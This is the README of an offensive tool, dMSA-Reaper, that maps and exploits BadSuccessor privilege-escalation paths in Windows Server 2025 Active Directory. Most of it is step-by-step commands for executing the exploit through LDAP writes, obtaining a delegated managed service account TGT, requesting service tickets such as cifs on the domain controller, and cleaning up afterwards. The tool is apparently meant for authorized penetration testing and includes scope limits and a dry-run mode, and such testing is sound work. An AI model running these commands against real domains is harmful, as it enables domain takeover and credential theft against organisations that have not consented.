# dMSA-Reaper

dMSA-Reaper maps and exploits BadSuccessor paths in Windows Server 2025
Active Directory. Its operator flow is deliberately small:

```text
map -> paths -> exploit -> tgt/ticket -> cleanup
```

Use it only in an Active Directory environment you are authorized to test.

## Install

```bash
python3 -m venv .venv
. .venv/bin/activate
pip install .
```

## Quick start

Map the domain:

```bash
dmsa-reaper map \
  -d corp.local --dc-ip 10.0.0.10 \
  -u analyst -p 'pass' --use-ldaps
```

List modern executable paths. Add `--legacy` when assessing an unpatched
domain controller:

```bash
dmsa-reaper paths --state state.json
```

LDAP writes use a small scope file. For example:

```json
{
  "domain": "corp.local",
  "allowedOUs": [
    "OU=Service Accounts,DC=corp,DC=local"
  ],
  "allowedTargets": [
    "CN=target,CN=Users,DC=corp,DC=local"
  ],
  "allowDaclPrimitives": false,
  "requireConfirmString": false
}
```

Preview a selected path:

```bash
dmsa-reaper exploit \
  --state state.json --path BS-7f31... \
  --scope scope.json --dry-run
```

Execute it with the same account and domain controller used for mapping:

```bash
dmsa-reaper exploit \
  --state state.json --path BS-7f31... \
  --scope scope.json --confirm \
  -d corp.local --dc-ip 10.0.0.10 \
  -u analyst -p 'pass' --use-ldaps
```

The command prints an operation ID. Use it to acquire the dMSA TGT:

```bash
dmsa-reaper tgt \
  --op OP-YYYYMMDD-deadbeef \
  --ccache /secure/operator.ccache \
  --identity analyst
```

Or acquire the TGT and a service ticket together:

```bash
dmsa-reaper ticket \
  --op OP-YYYYMMDD-deadbeef \
  --ccache /secure/operator.ccache \
  --identity analyst \
  --spn cifs/dc01.corp.local
```

Ticket artifacts are written under `.reaper/runs/<operation-id>/`; each SPN
gets its own cache and handoff script.

Remove the LDAP changes recorded by the operation:

```bash
dmsa-reaper cleanup \
  --op OP-YYYYMMDD-deadbeef \
  -u analyst -p 'pass' --use-ldaps
```

## Kerberos LDAP authentication

Set `KRB5CCNAME`, pass `-k`, and still provide the account name so the tool can
match the live identity to the mapped SID:

```bash
export KRB5CCNAME=/secure/operator.ccache
dmsa-reaper map -d corp.local --dc-ip 10.0.0.10 -u analyst -k
```

Password-based NTLM, LDAPS, STARTTLS, and ccache-based SASL/GSSAPI are
supported for LDAP. Pass-the-hash, AES keys, and keytabs are not supported
consistently by the LDAP path.

Operation journals live in `.reaper/operations`. Cleanup restores an attribute
only while it still contains the operation's value, removes only ACEs inserted
by that operation, and deletes a created object only when its `objectGUID`
matches the journal. Conflicts are left untouched and return a non-zero exit.
